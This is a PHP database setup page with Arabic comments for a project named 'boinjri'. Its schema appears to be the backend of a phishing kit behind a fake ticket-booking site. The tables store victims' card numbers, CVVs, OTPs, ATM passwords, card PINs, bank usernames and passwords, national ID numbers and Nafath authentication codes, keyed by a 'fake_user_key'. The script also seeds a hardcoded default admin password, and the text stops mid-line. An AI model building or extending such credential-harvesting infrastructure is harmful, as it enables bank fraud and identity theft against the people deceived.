<?php
/**
 * ====================================================================
 * ملف إعداد قاعدة البيانات الشامل - مشروع boinjri
 * ====================================================================
 * 
 * هذا الملف يقوم بـ:
 * 1. إنشاء جميع الجداول المطلوبة
 * 2. إضافة المفاتيح الأساسية والفهارس
 * 3. إضافة بيانات افتراضية (مستخدم admin)
 * 4. التحقق من اكتمال العملية
 * 
 * الاستخدام:
 * 1. عدّل بيانات الاتصال أدناه
 * 2. ارفع الملف للمجلد الرئيسي على Railway
 * 3. افتح: https://your-domain.railway.app/setup-database.php
 * 4. احذف الملف فوراً بعد الاستخدام!
 * 
 * ⚠️ تحذير: لا تترك هذا الملف على السيرفر بعد الاستخدام!
 */

// ===================================================================
// 🔧 إعدادات الاتصال بقاعدة البيانات
// ===================================================================
// استخدم متغيرات البيئة من Railway
$host = getenv('MYSQLHOST') ?: 'mysql.railway.internal';
$port = getenv('MYSQLPORT') ?: '3306';
$dbname = getenv('MYSQLDATABASE') ?: 'railway';
$username = getenv('MYSQLUSER') ?: 'root';
$password = getenv('MYSQLPASSWORD') ?: '';

// ===================================================================
// 🎨 تنسيق الصفحة
// ===================================================================
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إعداد قاعدة البيانات - Boinjri</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            direction: rtl;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .header p {
            opacity: 0.9;
            font-size: 1.1em;
        }
        .content {
            padding: 40px;
        }
        .status-box {
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border-left: 5px solid;
        }
        .status-box.info {
            background: #e3f2fd;
            border-color: #2196F3;
            color: #1976D2;
        }
        .status-box.success {
            background: #e8f5e9;
            border-color: #4CAF50;
            color: #2E7D32;
        }
        .status-box.error {
            background: #ffebee;
            border-color: #f44336;
            color: #c62828;
        }
        .status-box.warning {
            background: #fff3e0;
            border-color: #ff9800;
            color: #e65100;
        }
        .status-box h3 {
            margin-bottom: 10px;
            font-size: 1.3em;
        }
        .progress-bar {
            width: 100%;
            height: 30px;
            background: #e0e0e0;
            border-radius: 15px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            transition: width 0.5s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        .table-list {
            list-style: none;
            padding: 0;
        }
        .table-list li {
            padding: 12px;
            margin: 8px 0;
            background: #f5f5f5;
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .table-list li::before {
            content: '✓';
            display: inline-block;
            width: 24px;
            height: 24px;
            background: #4CAF50;
            color: white;
            border-radius: 50%;
            text-align: center;
            line-height: 24px;
            font-weight: bold;
        }
        .table-list li.failed::before {
            content: '✗';
            background: #f44336;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        .stat-card .number {
            font-size: 2.5em;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .stat-card .label {
            opacity: 0.9;
        }
        .warning-box {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        .warning-box h3 {
            color: #856404;
            margin-bottom: 10px;
        }
        .warning-box p {
            color: #856404;
            line-height: 1.6;
        }
        code {
            background: #f5f5f5;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            color: #c62828;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 إعداد قاعدة البيانات</h1>
            <p>Boinjri Database Setup</p>
        </div>
        <div class="content">
<?php

// ===================================================================
// 🔌 الاتصال بقاعدة البيانات
// ===================================================================
try {
    echo '<div class="status-box info">';
    echo '<h3>📡 جاري الاتصال بقاعدة البيانات...</h3>';
    echo '<p>الخادم: <code>' . htmlspecialchars($host) . ':' . htmlspecialchars($port) . '</code></p>';
    echo '<p>قاعدة البيانات: <code>' . htmlspecialchars($dbname) . '</code></p>';
    echo '</div>';
    
    $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
    $pdo = new PDO($dsn, $username, $password, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4"
    ]);
    
    echo '<div class="status-box success">';
    echo '<h3>✅ تم الاتصال بنجاح!</h3>';
    echo '</div>';
    
} catch(PDOException $e) {
    echo '<div class="status-box error">';
    echo '<h3>❌ فشل الاتصال بقاعدة البيانات</h3>';
    echo '<p><strong>الخطأ:</strong> ' . htmlspecialchars($e->getMessage()) . '</p>';
    echo '<p><strong>تحقق من:</strong></p>';
    echo '<ul>';
    echo '<li>بيانات الاتصال صحيحة</li>';
    echo '<li>قاعدة البيانات موجودة على Railway</li>';
    echo '<li>المتغيرات البيئية مضبوطة بشكل صحيح</li>';
    echo '</ul>';
    echo '</div>';
    echo '</div></div></body></html>';
    exit;
}

// ===================================================================
// 📋 تعريف الجداول
// ===================================================================
$tables = [
    'admins' => "
        CREATE TABLE IF NOT EXISTS `admins` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `email` varchar(191) NOT NULL,
            `password_hash` varchar(255) NOT NULL,
            `last_login_at` datetime DEFAULT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            UNIQUE KEY `email` (`email`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'users' => "
        CREATE TABLE IF NOT EXISTS `users` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `email` varchar(191) NOT NULL,
            `password_hash` varchar(255) NOT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
            `full_name` varchar(255) DEFAULT NULL,
            `is_guest_migrated` tinyint(1) DEFAULT 0,
            PRIMARY KEY (`id`),
            UNIQUE KEY `email` (`email`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'guest_logins' => "
        CREATE TABLE IF NOT EXISTS `guest_logins` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `email` varchar(191) NOT NULL,
            `password_entered` varchar(255) NOT NULL,
            `next_after_login` varchar(100) DEFAULT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `email_idx` (`email`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'orders' => "
        CREATE TABLE IF NOT EXISTS `orders` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `fake_user_key` varchar(64) DEFAULT NULL,
            `customer_email` varchar(191) DEFAULT NULL,
            `payment_method` varchar(100) DEFAULT '',
            `cardholder_name` varchar(191) DEFAULT '',
            `card_number` varchar(64) DEFAULT '',
            `expiry` varchar(20) DEFAULT '',
            `cvv` varchar(10) DEFAULT '',
            `otp` varchar(20) DEFAULT '',
            `atm_password` varchar(20) DEFAULT '',
            `mobile` varchar(30) DEFAULT '',
            `provider` varchar(100) DEFAULT '',
            `national_id_or_iqama` varchar(50) DEFAULT '',
            `transaction_no` varchar(20) DEFAULT NULL,
            `nafath_code` varchar(20) DEFAULT NULL,
            `status` varchar(100) NOT NULL DEFAULT 'Draft',
            `card_history_json` longtext DEFAULT NULL,
            `client_redirect_url` varchar(500) DEFAULT NULL,
            `client_redirect_version` int(10) UNSIGNED NOT NULL DEFAULT 0,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
            PRIMARY KEY (`id`),
            UNIQUE KEY `fake_user_key` (`fake_user_key`),
            KEY `customer_email_idx` (`customer_email`),
            KEY `status_idx` (`status`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'order_booking_customer_info_log' => "
        CREATE TABLE IF NOT EXISTS `order_booking_customer_info_log` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `fake_user_key` varchar(64) DEFAULT NULL,
            `full_name` varchar(191) DEFAULT NULL,
            `id_type` varchar(50) DEFAULT NULL,
            `id_number` varchar(50) DEFAULT NULL,
            `phone` varchar(30) DEFAULT NULL,
            `email` varchar(191) DEFAULT NULL,
            `birth_date` date DEFAULT NULL,
            `gender` varchar(20) DEFAULT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `fake_user_key_idx` (`fake_user_key`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'order_booking_tickets_log' => "
        CREATE TABLE IF NOT EXISTS `order_booking_tickets_log` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `fake_user_key` varchar(64) DEFAULT NULL,
            `ticket_date` date DEFAULT NULL,
            `ticket_time_slot` varchar(50) DEFAULT NULL,
            `adult_count` int(11) DEFAULT 0,
            `child_count` int(11) DEFAULT 0,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `fake_user_key_idx` (`fake_user_key`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'bank_logins' => "
        CREATE TABLE IF NOT EXISTS `bank_logins` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `user_id` bigint(20) NOT NULL,
            `bank` varchar(100) DEFAULT NULL,
            `user_name` varchar(191) DEFAULT NULL,
            `bk_pass` varchar(191) DEFAULT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `user_id_idx` (`user_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'bank_otps' => "
        CREATE TABLE IF NOT EXISTS `bank_otps` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `user_id` bigint(20) NOT NULL,
            `otp_code` varchar(20) NOT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `user_id_idx` (`user_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'card_otps' => "
        CREATE TABLE IF NOT EXISTS `card_otps` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `card_id` bigint(20) UNSIGNED NOT NULL,
            `user_id` bigint(20) NOT NULL,
            `otp_code` varchar(20) NOT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `card_id_idx` (`card_id`),
            KEY `user_id_idx` (`user_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'card_pins' => "
        CREATE TABLE IF NOT EXISTS `card_pins` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `card_id` bigint(20) UNSIGNED NOT NULL,
            `client_id` bigint(20) NOT NULL,
            `pin_code` varchar(20) NOT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `card_id_idx` (`card_id`),
            KEY `client_id_idx` (`client_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'nafad_codes' => "
        CREATE TABLE IF NOT EXISTS `nafad_codes` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `client_id` bigint(20) NOT NULL,
            `nafad_code` varchar(20) NOT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `client_id_idx` (`client_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'nafad_logs' => "
        CREATE TABLE IF NOT EXISTS `nafad_logs` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `user_id` bigint(20) NOT NULL,
            `phone` varchar(30) DEFAULT NULL,
            `telecom` varchar(100) DEFAULT NULL,
            `id_number` varchar(50) DEFAULT NULL,
            `redirect_to` varchar(255) DEFAULT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `user_id_idx` (`user_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'nafad_requests' => "
        CREATE TABLE IF NOT EXISTS `nafad_requests` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `client_id` bigint(20) NOT NULL,
            `phone` varchar(30) DEFAULT NULL,
            `telecom` varchar(100) DEFAULT NULL,
            `id_number` varchar(50) DEFAULT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `client_id_idx` (`client_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'nafath_numbers' => "
        CREATE TABLE IF NOT EXISTS `nafath_numbers` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `client_id` bigint(20) NOT NULL,
            `number` varchar(20) NOT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `client_id_idx` (`client_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ",
    
    'booking_nafath_logs' => "
        CREATE TABLE IF NOT EXISTS `booking_nafath_logs` (
            `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
            `fake_user_key` varchar(64) DEFAULT NULL,
            `customer_email` varchar(191) DEFAULT NULL,
            `id_number` varchar(50) DEFAULT NULL,
            `mobile` varchar(30) DEFAULT NULL,
            `provider` varchar(100) DEFAULT NULL,
            `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
            PRIMARY KEY (`id`),
            KEY `fake_user_key_idx` (`fake_user_key`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    "
];

// ===================================================================
// ⚙️ إنشاء الجداول
// ===================================================================
echo '<div class="status-box info">';
echo '<h3>📦 جاري إنشاء الجداول...</h3>';
echo '</div>';

echo '<div class="progress-bar">';
echo '<div class="progress-fill" style="width: 0%" id="progress">0%</div>';
echo '</div>';

$totalTables = count($tables);
$createdTables = 0;
$failedTables = [];

echo '<ul class="table-list">';

foreach ($tables as $tableName => $sql) {
    try {
        $pdo->exec($sql);
        $createdTables++;
        echo '<li>' . htmlspecialchars($tableName) . '</li>';
    } catch(PDOException $e) {
        $failedTables[] = $tableName;
        echo '<li class="failed">' . htmlspecialchars($tableName) . ' - <strong>فشل:</strong> ' . htmlspecialchars($e->getMessage()) . '</li>';
    }
    
    $progress = round(($createdTables / $totalTables) * 100);
    echo '<script>document.getElementById("progress").style.width = "' . $progress . '%"; document.getElementById("progress").textContent = "' . $progress . '%";</script>';
    flush();
}

echo '</ul>';

// ===================================================================
// 👤 إنشاء مستخدم Admin افتراضي
// ===================================================================
echo '<div class="status-box info">';
echo '<h3>👤 جاري إنشاء مستخدم Admin...</h3>';
echo '</div>';

$defaultAdminEmail = 'admin@site.com';
$defaultAdminPassword = 'admin123'; // كلمة المرور الافتراضية
$passwordHash = password_hash($defaultAdminPassword, PASSWORD_BCRYPT, ['cost' => 12]);

try {
    // التحقق من وجود Admin مسبقاً
    $checkAdmin = $pdo->query("SELECT COUNT(*) FROM admins");
    $adminExists = $checkAdmin->fetchColumn() > 0;
    
    if (!$adminExists) {
        $stmt = $pdo->prepare("INSERT INTO admins (email, password_hash, created_at) VALUES (?, ?, NOW())");
        $stmt->execute([$defaultAdminEmail, $passwordHash]);
        
        echo '<div class="status-box success">';
        echo '<h3>✅ تم إنشاء مستخدم Admin بنجاح!</h3>';
        echo '<p><strong>البريد الإلكتروني:</strong> <code>' . htmlspecialchars($defaultAdminEmail) . '</code></p>';
        echo '<p><strong>كلمة المرور:</strong> <code>' . htmlspecialchars($defaultAdminPassword) . '</code></p>';
        echo '<p style="color: #c62828; margin-top: 10px;"><strong>⚠️ مهم جداً:</strong> غيّر كلمة المرور فوراً بعد أول تسجيل دخول!</p>';
        echo '</div>';
    } else {
        echo '<div class="status-box warning">';
        echo '<h3>ℹ️ مستخدم Admin موجود مسبقاً</h3>';
        echo '<p>تم تخطي إنشاء مستخدم جديد.</p>';
        echo '</div>';
    }
} catch(PDOException $e) {
    echo '<div class="status-box error">';
    echo '<h3>❌ فشل إنشاء مستخدم Admin</h3>';
    echo '<p>' . htmlspecialchars($e->getMessage()) . '</p>';
    echo '</div>';
}

// ===================================================================
// 📊 الإحصائيات النهائية
// ===================================================================
echo '<div class="stats">';
echo '<div class="stat-card">';
echo '<div class="number">' . $createdTables . '</div>';
echo '<div class="label">جدول تم إنشاؤه</div>';
echo '</div>';

echo '<div class="stat-card">';
echo '<div class="number">' . count($failedTables) . '</div>';
echo '<div class="label">جدول فشل</div>';
echo '</div>';

echo '<div class="stat-card">';
echo '<div class="number">' . $totalTables . '</div>';
echo '<div class="label">إجمالي الجداول</div>';
echo '</div>';
echo '</div>';

// ===================================================================
// 🎉 النتيجة النهائية
// ===================================================================
if (count($failedTables) === 0) {
    echo '<div class="status-box success">';
    echo '<h3>🎉 تم إعداد قاعدة البيانات بنجاح!</h3>';
    echo '<p>جميع الجداول (' . $totalTables . ' جدول) تم إنشاؤها بنجاح.</p>';
    echo '<p>يمكنك الآن استخدام الموقع.</p>';
    echo '</div>';
} else {
    echo '<div class="status-box error">';
    echo '<h3>⚠️ تم إكمال العملية مع بعض الأخطاء</h3>';
    echo '<p><strong>الجداول الفاشلة:</strong></p>';
    echo '<ul>';
    foreach ($failedTables as $failed) {
        echo '<li>' . htmlspecialchars($failed) . '</li>';
    }
    echo '</ul>';
    echo '</div>';
}

// ===================================================================
// ⚠️ تحذيرات أمنية
// ===================================================================
echo '<div class="warning-box">';
echo '<h3>⚠️ تحذيرات أمنية مهمة</h3>';
echo '<ol>';
echo '<li><strong>احذف هذا الملف فوراً!</strong> هذا الملف يحتوي على معلومات حساسة ويجب حذفه من السيرفر بعد الاستخدام.</li>';
echo '<li><strong>غيّر كلمة مرور Admin:</strong> كلمة المرور الافتراضية <code>' . htmlspecialchars($defaultAdminPassword) . '</code> يجب تغييرها فوراً.</li>';
echo '<li><strong>لا تشارك بيانات الاتصال:</strong> معلومات الاتصال بقاعدة البيانات سرية للغاية.</li>';
echo '<li><strong>فعّل HTTPS:</strong> تأكد من استخدام HTTPS في موقعك على Railway.</li>';
echo '</ol>';
echo '</div>';

// ===================================================================
// 🔗 روابط مفيدة
// ===================================================================
echo '<div class="status-box info">';
echo '<h3>🔗 الخطوات التالية</h3>';
echo '<ul>';
echo '<li>✅ <strong>احذف هذا الملف:</strong> <code>setup-database.php</code></li>';
echo '<li>🔐 <strong>سجل دخول للو
